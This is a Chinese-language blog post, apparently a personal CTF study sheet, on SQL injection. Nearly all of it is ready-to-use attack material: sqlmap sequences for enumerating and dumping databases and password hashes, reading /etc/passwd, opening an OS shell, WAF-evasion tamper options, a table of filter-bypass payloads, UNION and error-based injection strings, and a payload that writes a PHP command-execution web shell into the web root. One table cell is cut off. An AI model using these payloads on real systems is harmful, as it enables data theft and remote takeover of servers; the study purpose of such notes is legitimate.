---
title: "SQL类"
image: '/images/138311505_p0_master1200.jpg'
pinned: true
comment: true
published: 2025-12-21
description: "sql学习"
category: 秘籍
tags: [秘籍]
---

# #SQLmap 学习中

## 一、  (标准连招)

1. 探测数据库名称

   sqlmap -u "URL" --batch --dbs

2. 查看当前数据库 (缩小范围)

   sqlmap -u "URL" --batch --current-db

3. 列出指定库的所有表

   sqlmap -u "URL" --batch -D "库名" --tables

4. 列出指定表的所有列

   sqlmap -u "URL" --batch -D "库名" -T "表名" --columns

5. 导出最终数据

   sqlmap -u "URL" --batch -D "库名" -T "表名" -C "列1,列2" --dump

------

## 二、 核心参数

### 1. 目标获取的 3 种姿势

- **GET 注入：** `-u "http://target.com/id=1"`

- **POST 注入：** `--data="id=1&user=admin"`

- **文本请求 ：** `-r request.txt`

  > **技巧：** 遇到复杂的 POST 请求、Header 注入（如 Cookie、User-Agent 注入），直接用 Burp Suite 抓包保存为 txt，在注入点打上星号 `*`，然后 `sqlmap -r search.txt`。

### 2. 探测等级与风险控制

- `--level=5`：探测等级。**1** 级只测 GET/POST；**2** 级加测 Cookie；**3** 级加测 User-Agent/Referer。
- `--risk=3`：风险等级。**3** 级会尝试 `OR` 类型的判断，在特定场景下可能导致数据表全量更新（慎用）。

### 3. 注入技术 (`--technique`)

SQLmap 默认尝试所有技术，指定技术可以极大提高速度：

- **B** : Boolean-based blind (布尔盲注)
- **E** : Error-based (报错注入)
- **U** : Union query-based (联合查询注入)
- **S** : Stacked queries (堆叠注入)
- **T** : Time-based blind (时间盲注)

------

## 三、 高级提权与文件操作 

当获取了注入点，如果权限足够（如 DBA），可以尝试以下操作：

| **命令**                                   | **作用**               | **说明**                                          |
| ------------------------------------------ | ---------------------- | ------------------------------------------------- |
| `--is-dba`                                 | 判断当前用户是否为 DBA | 返回 True/False                                   |
| `--users`                                  | 枚举数据库所有用户     | 了解目标架构                                      |
| `--passwords`                              | 枚举用户密码哈希       | 拿去 CMD5 撞库                                    |
| `--file-read="/etc/passwd"`                | **读取服务器文件**     | 比如读配置文件拿数据库明文密码                    |
| `--file-write="shell.php" --os-dest="..."` | **写入文件**           | 上传木马到服务器                                  |
| `--os-shell`                               | **交互式 Shell**       | 直接执行系统命令 (前提: PHP/ASP+DBA权限+绝对路径) |

------

## 四、 绕过与性能优化 

### 1. 绕过 WAF (防火墙)

- **脚本混淆：** `--tamper="space2comment.py,between.py"` (可以叠加多个)
- **随机 User-Agent：** `--random-agent`
- **频率限制：** `--delay=1` (每次请求间隔1秒) 或 `--safe-url` (每隔几次注入请求就访问一次正常页面)
- **IP 代理：** `--proxy="http://127.0.0.1:8080"` (配合 Burp 或代理池)

### 2. 加速扫描

- **多线程：** `--threads=10` 
- **优化开关：** `-o` (开启所有优化设置)
- **保持连接：** `--keep-alive`

------

## 五、 实战常见问题汇总 (Tips)

### 1. 爆不出数据

- **猜解模式：** 某些情况无法直接 dump，使用 `--common-tables` 或 `--common-columns` 暴力破解表名/列名。
- **清缓存：** 如果修改了代码但 SQLmap 还是报原来的错，加 `--flush-session`。
- **伪静态处理：** 目标是 `news/1.html`，手动改为 `news/1*.html`。

### 2. 盲注太慢？

- 使用 `--time-sec=3` 缩短等待时间（默认5秒）。
- 指定 `--dbms=mysql` 减少指纹识别请求。

### 3. 如何指定特定的注入位置？

如果 URL 是 `example.com/user/admin/id/1`，SQLmap 可能识别不到注入点：

- **手动标记：** `sqlmap -u "example.com/user/admin*/id/1"` (在 admin 后面加星号，强制告诉 SQLmap 这里是注入点)。

------

## 六、 常用 Tamper 脚本推荐

| **脚本名**       | **作用**                 |
| ---------------- | ------------------------ |
| `space2comment`  | 空格转为 `/**/`          |
| `base64encode`   | base64 编码 Payload      |
| `charencode`     | URL 编码                 |
| `randomcase`     | 随机大小写 (如 `SeLeCt`) |
| `apostrophemask` | 过滤单引号               |



---

# #SQL类：



## #绕过技巧：

| **拦截项 (被过滤)** | **替代方案 (绕过)**    | **具体用法 / Payload 示例**                                  | **备选/下一个方案 (如果不行)**                               |
| ------------------- | ---------------------- | ------------------------------------------------------------ | ------------------------------------------------------------ |
| **空格**            | `/**/` 或 `()`         | `1'/**/union/**/select...` `select(password)from(users)`     | `%0a` (换行符) 或 `%09` (Tab)                                |
| **and / or**        | `&&` / `||` 或 `^`     | `1                                                           |                                                              |
| **union / select**  | **堆叠注入 (Stacked)** | `1;show/**/tables;`                                          | `handler` 或 `TABLE` 关键字 (MySQL 8.0+)                     |
| **from**            | **无 From 注入**       | **查看列名**: `show/**/columns/**/in/**/Flag;` **查数据**: `*,1` (利用逻辑或拼接) | **Rename 法**: `rename/**/table/**/Flag/**/to/**/tmp;`       |
| **flag (关键字)**   | **通配符 \***          | `select/**/*/from/**/Flag` (配合 `*,1` 逻辑)                 | **Hex 编码**: `set/**/@a=0x(hex字符串);prepare/**/s/**/from/**/@a;` |
| **like / regexp**   | **直接大小比较**       | `database()>0x61` (比较字典序)                               | `strcmp(str1,str2)` (比较函数)                               |
| **substr / for**    | **字符串函数**         | `left(database(),1)='s'` `mid(database()/**/from/**/1/**/for/**/1)` | **直接 Hex 比较**: `database()>0x616161`                     |
| **updatexml**       | **其他报错函数**       | `extractvalue(1,concat(0x7e,database()))`                    | `exp(~(select*from(select/**/database())a))`                 |
| **handler**         | **预处理语句**         | `prepare/**/s/**/from/**/0x(hex数据);execute/**/s;`          | **Rename 法** 顶替原本查询的表名                             |
| **长度限制**        | **极致压缩**           | `1;desc/**/Flag` (代替 `show columns`)                       | **分段 Set**: 先多次 `set/**/@a=concat(@a,...)`              |



---



## #数字型：

```
源码:
$id = $_GET['id'];
$sql = "SELECT * FROM news WHERE id = $id";
```

`id=1 ORDER BY ?` **(爆列)**

`id=-1 UNION SELECT 1, 2, 3` **(回显确定)**

`id=-1 UNION SELECT 1, database(), 3` **(爆库)**

`id=-1 UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema = '数据库'` **(爆表)**

`id=-1 UNION SELECT 1, group_concat(column_name), 3 FROM information_schema.columns WHERE table_name = '表名'` **(读表)**

`id=-1 UNION SELECT 1, group_concat(username, '~', password), 3 FROM users` **(读数据，username和password为表users的数据)**



---



### #语法积累：

`information_schema.tables` ：记录表名的函数。

`WHERE table_schema=database()` ：过滤的函数，用来筛选表名。

`group_concat(table_name)` ：拼接读取的数据的函数。

`database()` ：显示当前数据库的函数。

`user()` ：显示当前登入用户的函数



---



## #字符型：

```
源码:
$id = $_GET['id'];
$sql = "SELECT * FROM users WHERE id = '$id'";
```

`id=1' ORDER BY ? --+` **(爆列)**

`id=-1' UNION SELECT 1, 2, 3 --+` **(回显确定)**

`id=-1' UNION SELECT 1, database(), 3 --+` **(爆库)**

`id=-1' UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema = '数据库' --+` **(爆表)**

`id=-1' UNION SELECT 1, group_concat(column_name), 3 FROM information_schema.columns WHERE table_name = '表名' --+` **(读表)**

`id=-1' UNION SELECT 1, group_concat(username, '~', password), 3 FROM users --+` **(读数据，username和password为表users的数据)**



---



### #其他类型的源码：

1.

```
$id = $_GET['id'];
$sql = "SELECT * FROM news WHERE id = ('$id')";
```

闭合类型为 ') 。



2.

```
$id = $_GET['id'];
$sql = "SELECT * FROM news WHERE id = ("$id")";
```

闭合类型为")。













4



---



## #报错型：

`id=-1 AND (updatexml(1, concat(0x7e, (database()), 0x7e), 1)) --+` **(最基础的)**

`id=-1' AND (updatexml(1, concat(0x7e, (database()), 0x7e), 1)) --+` **(后端存在单引号)**

`?id=-1 AND updatexml(1, concat(0x7e, (select table_name from information_schema.tables where table_schema='数据库' limit 0,1), 0x7e), 1) ` **(查表)**

`?id=-1 AND updatexml(1, concat(0x7e, (select column_name from information_schema.columns where table_name='表' limit 1,1), 0x7e), 1)`  **(查对应表的列)**

`?id=-1 AND updatexml(1, concat(0x7e, (select username from users limit 0,1), 0x7e), 1)`  **(查数据)**

```
sqlmap -u "题目的url" \
--level=5 \
--risk=3 \
--batch \
--technique=E \
--data="uname=admin&passwd=1&submit=Submit" \ (POST的内容)
-p passwd (指定注入点)
```

















**注意：**

由于报错注入的特殊性，所有内容都得多次注入后拿全。



---



## #文件注入：

`?id=1')) union select 1,2,'<?php @system($_GET["cmd"]); ?>' into outfile "/var/www/html/Less-7/shell.php"--+`	**(('	'))包裹**



---



## #布尔盲注：

`sqlmap -u "..." --batch --current-db`	**(爆破数据库)**

`sqlmap -u "..." --batch -D "数据库" --tables`	**(爆破数据库的表)**

`sqlmap -u "..." --batch -D "数据库名" -T "表名" --dump`	**(爆破表内数据)**

---

---

---

---

---

---

---

- **版权声明**：本文由 **余林阳** 创作，转载请注明出处。